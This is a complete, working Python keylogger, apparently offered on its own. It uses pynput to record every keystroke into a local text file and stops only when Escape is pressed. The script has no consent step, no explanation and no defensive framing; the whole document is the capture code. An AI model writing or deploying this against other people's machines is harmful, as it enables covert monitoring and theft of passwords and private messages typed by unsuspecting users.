from pynput import keyboard

# Define the file where the keystrokes will be logged
log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Record the key pressed, handling special keys
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Setup the listener threads for capturing key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()